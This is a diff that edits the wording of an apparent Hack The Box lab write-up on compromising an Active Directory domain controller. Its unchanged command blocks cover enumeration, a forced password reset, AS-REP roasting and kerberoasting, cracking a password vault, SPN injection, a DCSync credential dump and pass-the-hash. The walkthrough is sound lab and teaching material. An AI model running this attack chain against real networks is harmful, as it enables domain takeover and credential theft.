@@ -13,7 +13,7 @@ aliases:
 ![](../../0.%20Assets/Administrator-1791364366212.webp)
 ![149](../../0.%20Assets/Administrator-1791364382139.webp)
 
-Really fun machine! I would recommend it
+A really fun machine, and one I'd recommend.
 
 ---
 
@@ -21,21 +21,21 @@ Really fun machine! I would recommend it
 
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-Once we have the ports, we will do another `nmap` going more in detail
+With the ports in hand, I'll run a second, more detailed `nmap` scan.
 
 ```
 nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,55549,55599,55604,55611,55616,55630
@@ -78,28 +78,29 @@ PORT      STATE SERVICE       REASON          VERSION
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-Add the domain to the `/etc/hosts`
+Add the domain to `/etc/hosts`.
 
 ![](../../0.%20Assets/Administrator-1791366485420.webp)
 
-The server allows connections with anonymous 
+The server allows anonymous connections.
 
 ```
 nxc smb $T -u '' -p ''
 ```
+
 ![[Administrator-1791365773171.webp]]
 
-But can't see any shares or enumerate users, the `Guest` user is disabled 
+But we can't see any shares or enumerate users, and the `Guest` user is disabled.
 
+`rpc` was reachable with anonymous credentials, but we aren't allowed to run most queries.
 
-`rpc` was accessible with anonymous credentials but we are not allowed to perform different query's
 ![](../../0.%20Assets/Administrator-1791365750764.webp)
 
-I also tried anonymous access on `ftp` without success
+I also tried anonymous access on `ftp`, without success.
 
-Okay so we know the anonymous access is more or less allowed but for the most part we can't do much with it.
+So anonymous access is broadly allowed, but for the most part there isn't much we can do with it.
 
-Let's try other protocols
+Let's try other protocols.
 
 `ldap`
 ```
@@ -108,21 +109,21 @@ ldapsearch -H ldap://$T -x -b "CN=Users,DC=administrator,DC=htb" "(objectClass=p
 
 ![](../../0.%20Assets/Administrator-1791366067479.webp)
 
-And i couldn't really use any other protocols
+And I couldn't get anywhere with the other protocols either.
 
-Okay, I must be stupid, I have been looking for something for around 30 minutes and I just read this:
+After about 30 minutes of searching, I finally read this, which I should have caught much sooner:
 
 ![](../../0.%20Assets/Administrator-1791366559599.webp)
 
-Okay well we have credentials, let's see what we can do with them
+So we have credentials. Let's see what we can do with them.
 
 ![](../../0.%20Assets/Administrator-1791366610042.webp)
 
 ![](../../0.%20Assets/Administrator-1791366659415.webp)
 
-Okay, before we go into `winrm` and access the machine, let's see if olivia has any shares or anything important
+Before we jump into `winrm` and access the machine, let's check whether Olivia has any shares or anything important.
 
-I will start with `ftp` so I don't forget about it 
+I'll start with `ftp` so I don't forget about it.
 
 ```
 netexec ftp $T -u 'Olivia' -p 'ichliebedich'
@@ -146,16 +147,16 @@ netexec smb $T -u 'Olivia' -p 'ichliebedich'  -M spider_plus -o DOWNLOAD_FLAG=tr
 
 ![](../../0.%20Assets/Administrator-1791366981885.webp)
 
-The fie `registry.pol` was a binary and seemed interesting, so I opened with strings
+The file `registry.pol` was a binary and looked interesting, so I ran `strings` on it.
 
 ![](../../0.%20Assets/Administrator-1791367113201.webp)
 
 
 ![](../../0.%20Assets/Administrator-1791367079840.webp)
 
-We will keep it in mind just in case
+We'll keep it in mind just in case.
 
-Let's connect through evil-winrm
+Let's connect through evil-winrm.
 
 ```
  evil-winrm -i $T -u Olivia -p 'ichliebedich'
@@ -163,7 +164,7 @@ Let's connect through evil-winrm
 
 ![](../../0.%20Assets/Administrator-1791367200444.webp)
 
-Seems like `olivia` is some kind of administrator, hmm, let's pull out the big guns, let's dump the domain with `RustHound` and import it to `bloodhound`
+It looks like `olivia` is some kind of administrator. Let's bring out the heavier tooling: dump the domain with `RustHound` and import it into `bloodhound`.
 
 ```
  ./rusthound-ce \
@@ -175,23 +176,23 @@ Seems like `olivia` is some kind of administrator, hmm, let's pull out the big g
 
 ![](../../0.%20Assets/Administrator-1791367486612.webp)
 
-Import the `.zip` and add `olivia` to the objects we own
+Import the `.zip` and mark `olivia` as owned.
 
 ![](../../0.%20Assets/Administrator-1791367551857.webp)
 
-If we see the outbound objects
+Looking at the outbound object controls:
 
 ![](../../0.%20Assets/Administrator-1791367615046.webp)
 
-we can see we have the `genericall` right on `Michael` 
+We can see we have the `genericall` right over `Michael`.
 
-If we go in Linux abuse Bloodhound snitches on how to abuse this right
+Under the Linux Abuse tab, Bloodhound conveniently spells out how to abuse this right.
 
 ![](../../0.%20Assets/Administrator-1791368023903.webp)
 
-`Targeted kerberoast` It's a pretty cool technique but i do not want a hash, I want to be able to access the user directly so let's try the `Force change password` 
+`Targeted kerberoast` is a neat technique, but I don't want a hash, I want direct access to the user, so let's try the `Force change password` route instead.
 
-I had some issues so I looked online
+I ran into some issues, so I looked it up online.
 
 ![](../../0.%20Assets/Administrator-1791369219931.webp)
 
@@ -201,7 +202,7 @@ I had some issues so I looked online
 net user  "michael" "Newpass12345"
 ```
 
-Let's test it out
+Let's test it.
 
 ```
 netexec smb $T -u 'michael' -p 'Newpass12345'
@@ -210,11 +211,11 @@ netexec smb $T -u 'michael' -p 'Newpass12345'
 ![](../../0.%20Assets/Administrator-1791369260273.webp)
 
 
-Let's see what he is allowed to do
+Let's see what he's allowed to do.
 
 ![](../../0.%20Assets/Administrator-1791369402880.webp)
 
-Okay let's see what we can do with the user in the machine directly
+Now let's see what this user can do on the machine directly.
 
 ```
 ./nxcspray all $T -u 'michael' -p 'Newpass12345'
@@ -222,7 +223,7 @@ Okay let's see what we can do with the user in the machine directly
 
 ![](../../0.%20Assets/Administrator-1791369380226.webp)
 
-Again let's check shares before we change the password to benjamin
+Again, let's check the shares before we change benjamin's password.
 
 ```
 netexec smb $T -u 'michael' -p 'Newpass12345' --shares
@@ -238,9 +239,9 @@ SMB         10.129.160.52   445    DC               NETLOGON        READ        
 SMB         10.129.160.52   445    DC               SYSVOL          READ            Logon server share
 ```
 
-Same same, okay let's do the password change
+Same as before, so let's do the password change.
 
-I tried various methods and this one using `RPC` worked
+I tried a few methods, and this one using `RPC` worked.
 
 ```
 rpcclient -U administrator.htb/michael $T
@@ -250,12 +251,12 @@ rpcclient $> setuserinfo2 benjamin 23 12345aA
 
 ![](../../0.%20Assets/Administrator-1791370771702.webp)
 
-add `benjamin` to owned in bloodhound
+Mark `benjamin` as owned in bloodhound.
 
 ![](../../0.%20Assets/Administrator-1791370838914.webp)
 
 
-Doing the query for shortest path to domain admins we see that non of the users are actually usefull to us right now, let's see if we can do some user enumeration and some as-rep roasting or kerberoastin
+Running the shortest-path-to-domain-admins query, none of our users are useful right now, so let's do some user enumeration followed by as-rep roasting or kerberoasting.
 
 ![](../../0.%20Assets/Administrator-1791370930565.webp)
 
@@ -265,7 +266,7 @@ nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000
 
 ![](../../0.%20Assets/Administrator-1791371123609.webp)
 
-Great, let's generate a list from this
+Let's generate a list from this.
 
 ```
 nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
@@ -273,9 +274,9 @@ nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000 | grep "(SidTypeUser)" |
 
 ![](../../0.%20Assets/Administrator-1791371172248.webp)
 
-And let's start with the AD attacks
+And let's start on the AD attacks.
 
-`as-rep` roasting
+`as-rep` roasting.
 
 ```
 impacket-GetNPUsers 'administrator.htb/' \
@@ -290,31 +291,31 @@ impacket-GetNPUsers 'administrator.htb/' \
 ![](../../0.%20Assets/Administrator-1791371226087.webp)
 
 
-Okay okay, no problem, let's see `kerberoasting`
+No problem, let's try `kerberoasting`.
 
 ![](../../0.%20Assets/Administrator-1791371414621.webp)
 
-No luck either, seems like we really need to get access to the user `Emily`
+No luck there either. It looks like we really need to get access to the user `Emily`.
 
 
 
 ![](../../0.%20Assets/Administrator-1791374321018.webp)
 
-After quite some time and enumeration I remembered that there was an `ftp` server
+After a good while of enumeration, I remembered there was an `ftp` server.
 
 ![](../../0.%20Assets/Administrator-1791375421134.webp)
 
-(I literally hit my head against the table for a good 30 seconds after this)
+(I put my head in my hands for a solid 30 seconds after this one.)
 
 ![](../../0.%20Assets/Administrator-1791375455519.webp)
 
-Great let's see what this is
+Let's see what this is.
 
 ![](../../0.%20Assets/Administrator-1791375469416.webp)
 
-Okay so it looks like it is a password manager type a thing
+It looks like some kind of password manager file.
 
-I looked online for the mode for `hashcat` and did a brute force attack
+I looked up the right `hashcat` mode and ran a brute force attack.
 
 ```
 hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
@@ -324,26 +325,26 @@ hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
 
 ![](../../0.%20Assets/Administrator-1791375686719.webp)
 
-And it seems like we can open it in `password sage`
+It looks like we can open it in `Password Safe`.
 
 ```
 sudo apt install passwordsafe
 ```
 
-Import the file and use the password we just found
+Import the file and use the password we just cracked.
 ![](../../0.%20Assets/Administrator-1791375871923.webp)
 
 
 ![](../../0.%20Assets/Administrator-1791375917428.webp)
 
 
-I tested all the credentials
+I tested all of the credentials.
 
 ![](../../0.%20Assets/Administrator-1791376024518.webp)
 
-And only `Emily` appears to be the correct one (just what we needed)
+Only `Emily`'s turned out to be valid, which is exactly what we needed.
 
-Let's spray the protocols to see what we can do with the user
+Let's spray the protocols to see what this user can do.
 
 ```
 ./nxcspray all $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
@@ -351,7 +352,7 @@ Let's spray the protocols to see what we can do with the user
 
 ![](../../0.%20Assets/Administrator-1791376085143.webp)
 
-So we have access to `win-rm` let's connect
+We have `win-rm` access, so let's connect.
 
 ```
 evil-winrm -i $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
@@ -359,29 +360,28 @@ evil-winrm -i $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
 ![](../../0.%20Assets/Administrator-1791376161730.webp)
 
-And inside Emily's Desktop we can find the first flag
+Inside Emily's Desktop we find the first flag.
 
-
-Now we just follow bloodhounds path
+Now we just follow the path bloodhound laid out.
 
 ![](../../0.%20Assets/Administrator-1791376244697.webp)
 
-I had some issues but I figured it out, basically we want to make a targeted `kerberoast` attack and because `kerberoasting` depends on a SPN attached to a user and `Ethan` does not have one we need to inject one
+I hit a few snags but worked it out. We want a targeted `kerberoast` attack, and since `kerberoasting` relies on an SPN attached to a user and `Ethan` doesn't have one, we need to inject one.
 
-First mimic the DC's time
+First, sync our clock to the DC's time.
 
 ```
 sudo timedatectl set-ntp off
 sudo rdate -n $T
 ```
 
-Inject the fake  `SPN`
+Inject the fake `SPN`.
 
 ```
 bloodyAD -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.160.52 set object Ethan servicePrincipalName -v 'falso/servicio'
 ```
 
-Perform the `kerberoasting` attack
+Perform the `kerberoasting` attack.
 
 ```
 nxc ldap $T -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting hashes.txt
@@ -389,7 +389,7 @@ nxc ldap $T -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting hashes.t
 
 ![](../../0.%20Assets/Administrator-1791378282491.webp)
 
-Crack the hash
+Crack the hash.
 
 ```
 sudo hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  --force
@@ -403,15 +403,15 @@ sudo hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  --force
 ![](../../0.%20Assets/Administrator-1791378371061.webp)
 
 
-Great we only need the `DCSync`  or dump of credentials
+Now all that's left is the `DCSync`, or a dump of the credentials.
 
 ![](../../0.%20Assets/Administrator-1791378745023.webp)
 
-We can't access through `win-rm` so we need to abuse from Linux 
+We can't get in through `win-rm`, so we'll abuse this from Linux.
 
 ![](../../0.%20Assets/Administrator-1791378534011.webp)
 
-Becasuse `ethan` has the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` we can perform this attack, so let's ask the `DC` for the information in `ntds` and retrieve the hashes
+Because `ethan` holds the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights, we can run this attack. So let's ask the `DC` for the `ntds` data and retrieve the hashes.
 
 ```
 nxc smb $T -u ethan -p 'limpbizkit' --ntds
@@ -420,7 +420,7 @@ nxc smb $T -u ethan -p 'limpbizkit' --ntds
 
 ![](../../0.%20Assets/Administrator-1791378952156.webp)
 
-Now with the hash of the administrator we can perform a `PtH (pass the hash)` attack through `psexec`
+Now, with the administrator's hash, we can run a `PtH (pass the hash)` attack through `psexec`.
 
 ```
 psexec.py administrator.htb/administrator@$T -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
